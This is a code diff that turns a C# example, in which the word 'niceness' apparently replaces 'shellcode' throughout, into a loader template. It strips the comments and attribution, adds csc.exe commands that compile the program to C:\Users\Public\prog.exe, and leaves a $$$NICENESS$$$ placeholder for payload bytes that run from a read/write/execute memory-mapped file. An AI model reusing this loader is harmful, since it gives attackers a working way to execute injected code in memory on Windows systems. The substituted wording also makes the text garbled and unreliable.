@@ -1,10 +1,15 @@
-/**
- * C# niceness Example
- * (c) 2017 atom0s [atom0s@live.com]
- *
- * Demonstrates how to invoke niceness within C# using a memory mapped file.
- */
- 
+//Win7 x64
+//C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /unsafe /platform:x64 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs
+
+//Win7 x86
+//C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs
+
+//Win10 x64
+//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64/out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs
+
+//Win10 x86
+//C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /unsafe /platform:x86 /out:C:\Users\Public\prog.exe C:\Users\Public\mmniceness.cs
+
 namespace nicenessExample
 {
 	using System;
@@ -13,16 +18,8 @@ namespace nicenessExample
  
 	class Program
 	{
-		/// <summary>
-		/// Function delegate to invoke the niceness.
-		/// </summary>
-		/// <returns></returns>
 		private delegate IntPtr GetPebDelegate();
  
-		/// <summary>
-		/// niceness function used to obtain the PEB of the process.
-		/// </summary>
-		/// <returns></returns>
 		private unsafe static IntPtr GetPeb()
 		{
 
@@ -32,26 +29,17 @@ namespace nicenessExample
  
 			try
 			{
-				// Create a read/write/executable memory mapped file to hold our niceness..
 				mmf = MemoryMappedFile.CreateNew("__niceness", niceness_length, MemoryMappedFileAccess.ReadWriteExecute);
  
-				// Create a memory mapped view accessor with read/write/execute permissions..
 				mmva = mmf.CreateViewAccessor(0, niceness_length, MemoryMappedFileAccess.ReadWriteExecute);
-				
-
- 
-				// Write the niceness to the MMF..
 
 				$$$NICENESS$$$
 			 
-				// Obtain a pointer to our MMF..
 				var pointer = (byte*)0;
 				mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
  
-				// Create a function delegate to the niceness in our MMF..
 				var func = (GetPebDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(GetPebDelegate));
  
-				// Invoke the niceness..
 				return func();
 			}
 			catch
@@ -65,10 +53,6 @@ namespace nicenessExample
 			}
 		}
  
-		/// <summary>
-		/// Entry point.
-		/// </summary>
-		/// <param name="args"></param>
 		static void Main(string[] args)
 		{
 			var peb = GetPeb();
